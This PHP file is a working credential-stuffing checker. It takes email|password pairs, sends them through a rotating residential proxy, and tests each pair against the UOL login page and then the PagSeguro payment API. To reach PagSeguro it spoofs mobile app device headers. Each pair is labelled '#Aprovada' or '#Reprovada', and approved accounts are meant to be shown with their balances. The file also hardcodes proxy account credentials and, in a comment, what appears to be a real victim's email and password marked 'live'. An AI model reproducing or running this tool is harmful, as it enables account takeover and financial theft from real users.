
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
$bandeira = $_GET[tipo];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';


/*
$ch = curl_init('http://ip.smartproxy.com/'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
$result = curl_exec($ch); 
curl_close($ch); 
//echo $result; 
*/

/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netshoes.com.br/login');  
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 	
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$data = curl_exec($ch);
$clipping = getStr($data, '<input name="clipping" id="clipping" type="hidden" value="', '" />');
//setcookie
$tid = getStr($data, 'Set-Cookie: tid=', ';');
$uuid = getStr($data, 'Set-Cookie: uuid=', ';');
*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://visitante.acesso.uol.com.br/login.html');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
    'Host: visitante.acesso.uol.com.br',
    'Connection: keep-alive',
    'Cache-Control: max-age=0',
    'Upgrade-Insecure-Requests: 1',
    'Origin: https://blog.bol.uol.com.br',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: https://blog.bol.uol.com.br/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cookie: _ga=GA1.3.1789065753.1592175441; __gads=ID=1c8f26142c4f20f5:T=1592175444:S=ALNI_MY0HFpohH3tbq_XgA5UUlyCu7m7iQ; BTCTL=fa; _fbp=fb.2.1593719045921.1903255602; RMTRK.ID=2d01f1b0-d230-4e16-a03f-a0f6cac0b4a0; _gcl_aw=GCL.1594417689.EAIaIQobChMI1dH43NTD6gIVxQeRCh3IGARAEAAYASAAEgKTufD_BwE; _gac_UA-97689914-198=1.1594417689.EAIaIQobChMI1dH43NTD6gIVxQeRCh3IGARAEAAYASAAEgKTufD_BwE; _gaexp=GAX1.3.r2EAkzJlT62Lrbc413O7xg.18518.1; _gcl_au=1.1.1941550275.1596985374; _hjid=2f8f711f-8e4a-4f0c-a773-fe2b246e47f4; _gid=GA1.3.1728797571.1598648071; DNA=fa257d7574994a138633c0084d8b7d87|17436d9bd95|true; DEretargeting=563',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=REDIR%7Chttp%3A%2F%2Fblog.uol.com.br%2Fshowhome.html&skin=blog&userconcat='.trim(urlencode($email)).'&user='.trim(urlencode($email)).'&pass='.trim(urlencode($senha)).'&x=4&y=7');
$data1 = curl_exec($ch);
echo $data1;
$return = getStr($data1, '<strong class="data-error" data-error="200 - ', '">');


	// Reprovada
     if(stristr($data1,'E-mail, CPF/CNPJ ou senha incorretos') !== false){
        echo '             
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Return → '.$return.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
	
else{
		// Aprovada
	//maxyaline@yahoo.com.br|put954ion803 live
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mb.api.pagseguro.uol/v2/auth');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
    'App-Device: samsung / SM-N976N',
    'App-OS: Android 5.1.1 / Api-22',
    'App-User: samsung / SM-N976N Android 5.1.1 / Api-22',
    'User-Agent: PagSeguro release/4.22.4 (br.com.uol.ps.myaccount; build:327; Android 5.1.1)',
    'X-UUID: fqNiEMdCaCM',
    'X-App-TimeStamp: 2020-08-29T14:16:02-0300',
    'X-Device-Token: c37Ku92t00b_gTks2QwE_y:APA91bEhin4p4AALwdPVnBXqe8DueRn7INSCs9qdXEYIiD86jPne1CGCa1mf_o3SVLVuN5c44J2cjM2QQTxp-MPfwTmqtW_3oTridd3i1P4HwJrL-tpEm3MRVrH4RfILCLSZ8Gi5aE9x',
    'X-PROFILE-A: EA3EED39-1A64-49E0-B2BE-1ABA9DD5519A',
    'Content-Type: application/json; charset=UTF-8',
    'Host: mb.api.pagseguro.uol',
    'Connection: Keep-Alive',
    'Accept-Encoding: gzip',
    'X-NewRelic-ID: VgYDV1ZaCBABVFRWBgEGUVQ=',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","userName":"'.$email.'","httpStatusCode":-1}');
$data2 = curl_exec($ch);
$accessToken = getStr($data2, '"accessToken":"', '"');
$return1 = getStr($data2, 'message":"', '"}]}');
//message":"Sua conta foi bloqueada"}]}
//echo $data2;

   
		
		if(stristr($data2,'accessToken') !== false){
       echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Disponível: '.$disponivel.' | Receber: '.$receber.' | Bloqueado: '.$bloqueado.'  <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';



}


else{
 echo '             
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Return → '.$return1.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }


} // fim else
curl_close($ch);
 ob_flush();        
                             
?>
